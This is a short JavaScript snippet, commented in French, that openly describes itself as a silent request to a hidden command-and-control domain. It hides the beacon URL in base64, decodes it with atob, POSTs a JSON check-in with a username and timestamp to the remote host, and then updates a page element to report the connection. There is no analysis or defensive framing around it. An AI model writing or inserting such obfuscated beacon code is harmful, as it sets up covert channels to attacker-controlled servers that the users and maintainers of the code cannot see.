// Ce script fait une requête silencieuse vers un domaine C2 caché
const beaconUrl = atob("aHR0cHM6Ly9jMmMuc2VjcmV0LXRyaGFja25vbi5vbmxpbmUvcGluZw==");

fetch(beaconUrl, {
  method: "POST",
  body: JSON.stringify({ user: "anonymous", time: Date.now() }),
  headers: {
    "Content-Type": "application/json"
  }
}).then(() => {
  document.getElementById("status").textContent = "✅ Connexion établie.";
});
